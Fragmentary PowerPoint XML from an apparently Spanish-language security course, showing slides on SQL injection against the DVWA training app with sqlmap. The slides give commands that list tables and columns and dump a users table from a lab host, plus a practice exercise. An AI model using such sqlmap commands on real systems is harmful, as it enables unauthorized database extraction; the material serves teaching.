                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>8aqed3p6bn93qc3qce7ag99o11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>" –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dbs</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5" name="Imagen 4" descr="Interfaz de usuario gráfica, Texto, Chat o mensaje de texto&#10;&#10;Descripción generada automáticamente con confianza media">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E4E2C4E-ED2A-5DCE-21B1-E4DD8457F903}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2481579" y="2549413"/>
            <a:ext cx="7954477" cy="3071790"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2628521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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAD19E29-EFAB-5934-8572-41D82E4A293B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="209746" y="848747"/>
            <a:ext cx="11526625" cy="984885"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Si incluimos el nombre del esquema y si quiero buscar en las tablas</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -u "http://192.168.99.1/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/vulnerabilities/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=ns2g029bs6q9etpsqjomctoa7c" -D test -tables</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4" descr="Pantalla de computadora con letras&#10;&#10;Descripción generada automáticamente con confianza media">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{140ED45F-D4A7-039A-968C-36027F41A714}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1529472" y="2320371"/>
            <a:ext cx="8557447" cy="3005773"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7145651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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{768B1FC0-D58E-3A81-CC52-A82B7AD6FCAF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344055" y="848747"/>
            <a:ext cx="11156645" cy="984885"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="2000" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Si me interesan las columnas de una tabla</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> -u "http://192.168.99.1/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/vulnerabilities/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=8aqed3p6bn93qc3qce7ag99o11" -D test -T users –columns</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4" descr="Imagen que contiene texto, tabla, computadora, escritorio&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7AF392F-1BFB-6285-CE40-8778B3B84713}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4155240" y="2150359"/>
            <a:ext cx="3127375" cy="2874010"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35377136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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="CuadroTexto 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9ADBF5B7-EB7C-36ED-75B0-668F6CB31952}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="183799" y="731462"/>
            <a:ext cx="11316901" cy="1685333"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Si quieres usar un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>hack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> más general usa "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> -u "http://192.168.99.1/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dvwa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/vulnerabilities/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>sqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=8aqed3p6bn93qc3qce7ag99o11" -D test -T users --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>dump</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:effectLst/>
              <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="180340" indent="269875" algn="just">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Yu Mincho" panose="02020400000000000000" pitchFamily="18" charset="-128"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Se harán algunas preguntas</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E64C5C3-5D32-2C77-E529-9D0109C2D05D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="2416795"/>
            <a:ext cx="6427950" cy="1561635"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Imagen 6" descr="Texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D236FD85-984A-8DDF-E07D-B1BDFEB9F710}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5315770" y="3638746"/>
            <a:ext cx="6713643" cy="2960508"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32852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435092" y="229220"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Práctica</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7171" name="Marcador de texto 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1654793" y="1404378"/>
            <a:ext cx="9343950" cy="4248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a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar el ataque al nivel elevado</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Realizar ataque </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="80628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254955" y="237138"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – </a:t>
            </a:r>
            <a:r>
